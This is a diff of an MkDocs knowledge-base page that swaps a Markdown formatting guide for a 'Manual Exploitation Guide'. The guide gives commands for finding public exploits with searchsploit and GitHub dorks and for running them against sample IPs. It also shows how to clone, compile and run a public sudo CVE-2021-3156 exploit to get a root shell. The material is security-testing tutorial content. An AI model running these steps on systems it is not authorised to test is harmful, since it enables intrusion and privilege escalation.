@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../ssh/">
+        <link rel="prev" href="../linuxuserpriv/">
       
       
-        <link rel="next" href="../venv/">
+        <link rel="next" href="../msfc/">
       
       
       <link rel="icon" href="../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>Formatting Guide - My Knowledge Base</title>
+        <title>Manual Exploitation - My Knowledge Base</title>
       
     
     
@@ -70,7 +70,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#mkdocs-formatting-guide" class="md-skip">
+        <a href="#manual-exploitation-guide" class="md-skip">
           Skip to content
         </a>
       
@@ -106,7 +106,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              Formatting Guide
+              Manual Exploitation
             
           </span>
         </div>
@@ -364,10 +364,31 @@
       
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../manuexpl/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  <span class="md-ellipsis">
+    Manual Exploitation
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   <span class="md-ellipsis">
@@ -377,6 +398,248 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#introduction" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Introduction
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#finding-an-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Finding an Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Finding an Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-searching-for-exploits-on-github" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Searching for Exploits on GitHub
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1️⃣ Searching for Exploits on GitHub">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#google-dork-to-search-github" class="md-nav__link">
+    <span class="md-ellipsis">
+      Google Dork to Search GitHub
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#using-exploit-db-searchsploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      Using Exploit-DB &amp; SearchSploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cloning-setting-up-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Cloning &amp; Setting Up the Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Cloning & Setting Up the Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2-cloning-the-exploit-repository" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Cloning the Exploit Repository
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-install-dependencies" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Install Dependencies
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploiting-the-target" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Exploiting the Target
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Exploiting the Target">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#4-running-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      4️⃣ Running the Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4️⃣ Running the Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#python-exploit-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Exploit Example
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#bash-exploit-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bash Exploit Example
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cc-exploit-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      C/C++ Exploit Example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-manual-exploitation-of-cve-2021-3156-sudo-heap-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-download-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Download the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-compile-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Compile the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-run-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Run the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#troubleshooting-tips" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Troubleshooting &amp; Tips
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Troubleshooting & Tips">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#if-the-exploit-fails" class="md-nav__link">
+    <span class="md-ellipsis">
+      If the Exploit Fails:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#conclusion" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Conclusion
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -553,19 +816,17 @@
       
   
   
-    
   
   
-  
     
     
     
     
-    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+    <li class="md-nav__item md-nav__item--nested">
       
         
         
-        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" checked>
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_18" >
         
           
           <label class="md-nav__link" for="__nav_18" id="__nav_18_label" tabindex="0">
@@ -580,7 +841,7 @@
             <span class="md-nav__icon md-icon"></span>
           </label>
         
-        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="true">
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_18_label" aria-expanded="false">
           <label class="md-nav__title" for="__nav_18">
             <span class="md-nav__icon md-icon"></span>
             MkDocs
@@ -591,31 +852,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  <span class="md-ellipsis">
-    Formatting Guide
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../mkdocs-formatting-guide/" class="md-nav__link">
         
   
   <span class="md-ellipsis">
@@ -625,185 +865,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#basic-document-structure" class="md-nav__link">
-    <span class="md-ellipsis">
-      Basic Document Structure
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#lists-bullet-points" class="md-nav__link">
-    <span class="md-ellipsis">
-      Lists &amp; Bullet Points
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Lists & Bullet Points">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#unordered-list" class="md-nav__link">
-    <span class="md-ellipsis">
-      Unordered List:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#ordered-list" class="md-nav__link">
-    <span class="md-ellipsis">
-      Ordered List:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#links-images" class="md-nav__link">
-    <span class="md-ellipsis">
-      Links &amp; Images
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Links & Images">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#adding-links" class="md-nav__link">
-    <span class="md-ellipsis">
-      Adding Links:
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#adding-images" class="md-nav__link">
-    <span class="md-ellipsis">
-      Adding Images:
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#blockquotes-callouts" class="md-nav__link">
-    <span class="md-ellipsis">
-      Blockquotes &amp; Callouts
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
-    <span class="md-ellipsis">
-      Tables
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#customizing-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Customizing MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Customizing MkDocs">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#configuring-mkdocsyml" class="md-nav__link">
-    <span class="md-ellipsis">
-      Configuring mkdocs.yml
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#running-the-local-server" class="md-nav__link">
-    <span class="md-ellipsis">
-      Running the Local Server
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#extending-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Extending MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Extending MkDocs">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#installing-plugins" class="md-nav__link">
-    <span class="md-ellipsis">
-      Installing Plugins
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#conclusion" class="md-nav__link">
-    <span class="md-ellipsis">
-      Conclusion
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -909,37 +970,85 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#basic-document-structure" class="md-nav__link">
+  <a href="#introduction" class="md-nav__link">
     <span class="md-ellipsis">
-      Basic Document Structure
+      🔹 Introduction
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#lists-bullet-points" class="md-nav__link">
+  <a href="#finding-an-exploit" class="md-nav__link">
     <span class="md-ellipsis">
-      Lists &amp; Bullet Points
+      🔹 Finding an Exploit
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Lists & Bullet Points">
+    <nav class="md-nav" aria-label="🔹 Finding an Exploit">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#unordered-list" class="md-nav__link">
+  <a href="#1-searching-for-exploits-on-github" class="md-nav__link">
     <span class="md-ellipsis">
-      Unordered List:
+      1️⃣ Searching for Exploits on GitHub
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="1️⃣ Searching for Exploits on GitHub">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#google-dork-to-search-github" class="md-nav__link">
+    <span class="md-ellipsis">
+      Google Dork to Search GitHub
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#ordered-list" class="md-nav__link">
+  <a href="#using-exploit-db-searchsploit" class="md-nav__link">
     <span class="md-ellipsis">
-      Ordered List:
+      Using Exploit-DB &amp; SearchSploit
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cloning-setting-up-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Cloning &amp; Setting Up the Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Cloning & Setting Up the Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#2-cloning-the-exploit-repository" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Cloning the Exploit Repository
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-install-dependencies" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Install Dependencies
     </span>
   </a>
   
@@ -951,28 +1060,94 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#links-images" class="md-nav__link">
+  <a href="#exploiting-the-target" class="md-nav__link">
     <span class="md-ellipsis">
-      Links &amp; Images
+      🔹 Exploiting the Target
     </span>
   </a>
   
-    <nav class="md-nav" aria-label="Links & Images">
+    <nav class="md-nav" aria-label="🔹 Exploiting the Target">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#adding-links" class="md-nav__link">
+  <a href="#4-running-the-exploit" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Links:
+      4️⃣ Running the Exploit
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="4️⃣ Running the Exploit">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#python-exploit-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      Python Exploit Example
     </span>
   </a>
   
 </li>
         
           <li class="md-nav__item">
-  <a href="#adding-images" class="md-nav__link">
+  <a href="#bash-exploit-example" class="md-nav__link">
     <span class="md-ellipsis">
-      Adding Images:
+      Bash Exploit Example
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#cc-exploit-example" class="md-nav__link">
+    <span class="md-ellipsis">
+      C/C++ Exploit Example
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#example-manual-exploitation-of-cve-2021-3156-sudo-heap-overflow" class="md-nav__link">
+    <span class="md-ellipsis">
+      🔹 Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="🔹 Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#1-download-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      1️⃣ Download the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#2-compile-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      2️⃣ Compile the Exploit
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#3-run-the-exploit" class="md-nav__link">
+    <span class="md-ellipsis">
+      3️⃣ Run the Exploit
     </span>
   </a>
   
@@ -984,70 +1159,19 @@
 </li>
       
         <li class="md-nav__item">
-  <a href="#blockquotes-callouts" class="md-nav__link">
+  <a href="#troubleshooting-tips" class="md-nav__link">
     <span class="md-ellipsis">
-      Blockquotes &amp; Callouts
+      🔹 Troubleshooting &amp; Tips
     </span>
   </a>
   
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#tables" class="md-nav__link">
-    <span class="md-ellipsis">
-      Tables
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#customizing-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Customizing MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Customizing MkDocs">
+    <nav class="md-nav" aria-label="🔹 Troubleshooting & Tips">
       <ul class="md-nav__list">
         
           <li class="md-nav__item">
-  <a href="#configuring-mkdocsyml" class="md-nav__link">
+  <a href="#if-the-exploit-fails" class="md-nav__link">
     <span class="md-ellipsis">
-      Configuring mkdocs.yml
-    </span>
-  </a>
-  
-</li>
-        
-          <li class="md-nav__item">
-  <a href="#running-the-local-server" class="md-nav__link">
-    <span class="md-ellipsis">
-      Running the Local Server
-    </span>
-  </a>
-  
-</li>
-        
-      </ul>
-    </nav>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#extending-mkdocs" class="md-nav__link">
-    <span class="md-ellipsis">
-      Extending MkDocs
-    </span>
-  </a>
-  
-    <nav class="md-nav" aria-label="Extending MkDocs">
-      <ul class="md-nav__list">
-        
-          <li class="md-nav__item">
-  <a href="#installing-plugins" class="md-nav__link">
-    <span class="md-ellipsis">
-      Installing Plugins
+      If the Exploit Fails:
     </span>
   </a>
   
@@ -1061,7 +1185,7 @@
         <li class="md-nav__item">
   <a href="#conclusion" class="md-nav__link">
     <span class="md-ellipsis">
-      Conclusion
+      🔹 Conclusion
     </span>
   </a>
   
@@ -1083,137 +1207,94 @@
 
 
 
+<h1 id="manual-exploitation-guide">Manual Exploitation Guide</h1>
+<h2 id="introduction">🔹 Introduction</h2>
+<p>Manual exploitation is the process of <strong>identifying, downloading, and executing exploits</strong> without using automated tools like Metasploit. This approach is useful when <strong>Metasploit does not have a suitable exploit</strong> or when testing requires <strong>manual control</strong> over execution.</p>
 <hr />
-<h1 id="mkdocs-formatting-guide">MkDocs Formatting Guide</h1>
-<p>MkDocs is a static site generator for project documentation that uses Markdown. This guide covers the essential formatting and structuring tips for writing articles in MkDocs.</p>
-<hr />
-<h2 id="basic-document-structure">Basic Document Structure</h2>
-<p>MkDocs follows a simple hierarchy using <strong>Markdown headings</strong>:</p>
-<pre><code class="language-markdown"># Main Title (h1)
-## Subheading (h2)
-### Section (h3)
-#### Subsection (h4)
+<h2 id="finding-an-exploit">🔹 Finding an Exploit</h2>
+<p>Before manually exploiting a target, research and obtain a working exploit.</p>
+<h3 id="1-searching-for-exploits-on-github"><strong>1️⃣ Searching for Exploits on GitHub</strong></h3>
+<p>Many proof-of-concept (PoC) exploits are published on <strong>GitHub</strong>.</p>
+<h4 id="google-dork-to-search-github"><strong>Google Dork to Search GitHub</strong></h4>
+<pre><code class="language-bash">site:github.com &quot;&lt;service&gt; exploit&quot;
 </code></pre>
 <p><strong>Example:</strong></p>
-<pre><code class="language-markdown"># My MkDocs Knowledge Base
-
-## Networking Commands
-
-### Scanning Open Ports with Nmap
-```bash
-nmap -sV -A &lt;target&gt;
+<pre><code class="language-bash">site:github.com &quot;OpenSSH 7.2 exploit&quot;
 </code></pre>
-<pre><code>
----
-
-## Code Blocks
-
-For adding code snippets, use **triple backticks** (` ``` `) with the language specified:
-
-```markdown
-```bash
-ls -lah
+<ul>
+<li>Look for repositories with PoC code.</li>
+<li>Check README files for <strong>installation and usage instructions</strong>.</li>
+</ul>
+<h4 id="using-exploit-db-searchsploit"><strong>Using Exploit-DB &amp; SearchSploit</strong></h4>
+<pre><code class="language-bash">searchsploit OpenSSH 7.2
 </code></pre>
-<pre><code>
-This renders as:
-
-```bash
-ls -lah
-</code></pre>
-<p>Alternatively, you can use <strong>four-space indentation</strong>, but backticks are preferred for syntax highlighting:</p>
-<pre><code class="language-markdown">    ls -lah
+<p>If a relevant exploit is found, <strong>copy it locally</strong>:</p>
+<pre><code class="language-bash">searchsploit -m exploits/unix/remote/4091.py
 </code></pre>
 <hr />
-<h2 id="lists-bullet-points">Lists &amp; Bullet Points</h2>
-<p>MkDocs supports both <strong>unordered</strong> and <strong>ordered</strong> lists:</p>
-<h3 id="unordered-list">Unordered List:</h3>
-<pre><code class="language-markdown">- Item 1
-- Item 2
-  - Subitem 2.1
-  - Subitem 2.2
+<h2 id="cloning-setting-up-the-exploit">🔹 Cloning &amp; Setting Up the Exploit</h2>
+<p>Once a suitable exploit is found on GitHub, clone and set it up.</p>
+<h3 id="2-cloning-the-exploit-repository"><strong>2️⃣ Cloning the Exploit Repository</strong></h3>
+<pre><code class="language-bash">git clone https://github.com/username/exploit-repo.git
 </code></pre>
-<h3 id="ordered-list">Ordered List:</h3>
-<pre><code class="language-markdown">1. First item
-2. Second item
-   1. Sub-item
-   2. Sub-item
+<p>Then, <strong>navigate into the directory</strong>:</p>
+<pre><code class="language-bash">cd exploit-repo
 </code></pre>
-<hr />
-<h2 id="links-images">Links &amp; Images</h2>
-<h3 id="adding-links">Adding Links:</h3>
-<pre><code class="language-markdown">[OpenAI](https://openai.com)
+<h3 id="3-install-dependencies"><strong>3️⃣ Install Dependencies</strong></h3>
+<p>Many exploits require additional dependencies. Check the <strong>README</strong> or <code>requirements.txt</code>.</p>
+<pre><code class="language-bash">pip install -r requirements.txt
 </code></pre>
-<p>This renders as: <a href="https://openai.com">OpenAI</a></p>
-<h3 id="adding-images">Adding Images:</h3>
-<pre><code class="language-markdown">![Alt Text](https://example.com/image.png)
-</code></pre>
-<p>You can also specify image width in MkDocs using custom CSS.</p>
-<hr />
-<h2 id="blockquotes-callouts">Blockquotes &amp; Callouts</h2>
-<p>Blockquotes are used for emphasizing notes or warnings:</p>
-<pre><code class="language-markdown">&gt; This is a blockquote. Use it for important notes.
-</code></pre>
-<p>To create <strong>callouts</strong> using extensions like <code>admonition</code>:</p>
-<pre><code class="language-markdown">!!! note &quot;Important Note&quot;
-    This is a highlighted note.
+<p>If using a compiled exploit (C, C++):</p>
+<pre><code class="language-bash">gcc exploit.c -o exploit
 </code></pre>
 <hr />
-<h2 id="tables">Tables</h2>
-<p>Tables can be created using <strong>pipes (</strong>``<strong>)</strong>:</p>
-<pre><code class="language-markdown">| Command  | Description       |
-|----------|-----------------|
-| `ls`     | List directory contents |
-| `pwd`    | Print working directory |
+<h2 id="exploiting-the-target">🔹 Exploiting the Target</h2>
+<h3 id="4-running-the-exploit"><strong>4️⃣ Running the Exploit</strong></h3>
+<h4 id="python-exploit-example"><strong>Python Exploit Example</strong></h4>
+<pre><code class="language-bash">python3 exploit.py --target 192.168.1.100 --port 8080
 </code></pre>
-<p>This renders as:</p>
-<table>
-<thead>
-<tr>
-<th>Command</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ls</code></td>
-<td>List directory contents</td>
-</tr>
-<tr>
-<td><code>pwd</code></td>
-<td>Print working directory</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<h2 id="customizing-mkdocs">Customizing MkDocs</h2>
-<h3 id="configuring-mkdocsyml">Configuring <code>mkdocs.yml</code></h3>
-<p>Your `` defines the navigation and settings:</p>
-<pre><code class="language-yaml">site_name: My Documentation
-nav:
-  - Home: index.md
-  - Guide: guide.md
-theme:
-  name: material
+<h4 id="bash-exploit-example"><strong>Bash Exploit Example</strong></h4>
+<pre><code class="language-bash">chmod +x exploit.sh
+./exploit.sh 192.168.1.100
 </code></pre>
-<h3 id="running-the-local-server">Running the Local Server</h3>
-<p>Start the MkDocs server locally to preview changes:</p>
-<pre><code class="language-bash">mkdocs serve
-</code></pre>
-<p>Visit <code>http://127.0.0.1:8000/</code> in your browser.</p>
-<hr />
-<h2 id="extending-mkdocs">Extending MkDocs</h2>
-<h3 id="installing-plugins">Installing Plugins</h3>
-<p>You can extend MkDocs with plugins:</p>
-<pre><code class="language-bash">pip install mkdocs-material
-</code></pre>
-<p>Then add it to <code>mkdocs.yml</code>:</p>
-<pre><code class="language-yaml">theme:
-  name: material
+<h4 id="cc-exploit-example"><strong>C/C++ Exploit Example</strong></h4>
+<pre><code class="language-bash">./exploit 192.168.1.100
 </code></pre>
 <hr />
-<h2 id="conclusion">Conclusion</h2>
-<p>This guide covers the essentials for formatting articles in MkDocs, including headings, code blocks, lists, links, images, and tables. Keep your documentation structured, readable, and well-organized!</p>
+<h2 id="example-manual-exploitation-of-cve-2021-3156-sudo-heap-overflow">🔹 Example: Manual Exploitation of CVE-2021-3156 (Sudo Heap Overflow)</h2>
+<p>This vulnerability allows <strong>local privilege escalation</strong>.</p>
+<h3 id="1-download-the-exploit"><strong>1️⃣ Download the Exploit</strong></h3>
+<pre><code class="language-bash">git clone https://github.com/blasty/CVE-2021-3156.git
+cd CVE-2021-3156
+</code></pre>
+<h3 id="2-compile-the-exploit"><strong>2️⃣ Compile the Exploit</strong></h3>
+<pre><code class="language-bash">gcc exploit.c -o sudo_exploit
+</code></pre>
+<h3 id="3-run-the-exploit"><strong>3️⃣ Run the Exploit</strong></h3>
+<pre><code class="language-bash">./sudo_exploit
+</code></pre>
+<ul>
+<li>If successful, a <strong>root shell (<code>#</code>)</strong> will be obtained.</li>
+</ul>
 <hr />
+<h2 id="troubleshooting-tips">🔹 Troubleshooting &amp; Tips</h2>
+<h3 id="if-the-exploit-fails"><strong>If the Exploit Fails:</strong></h3>
+<ol>
+<li><strong>Check the Target System Version</strong>
+   <code>bash
+   uname -a
+   cat /etc/os-release
+   sudo --version</code></li>
+<li><strong>Try a Different Exploit Variant</strong>
+   <code>bash
+   searchsploit sudo</code></li>
+<li><strong>Modify the Exploit Code</strong> (Adjust hardcoded values, shellcode, offsets).</li>
+<li><strong>Ensure Dependencies Are Installed</strong> (Use <code>pip</code>, <code>apt-get</code>, or <code>dnf</code>).</li>
+<li><strong>Run the Exploit with Debugging</strong> (Use <code>strace</code>, <code>gdb</code>, or <code>ltrace</code>).</li>
+</ol>
+<hr />
+<h2 id="conclusion">🔹 Conclusion</h2>
+<p>Manual exploitation requires <strong>careful research, correct setup, and debugging skills</strong>. Using <strong>GitHub, Exploit-DB, and SearchSploit</strong>, security testers can find and execute exploits when automated tools are unavailable.</p>
 
 
 
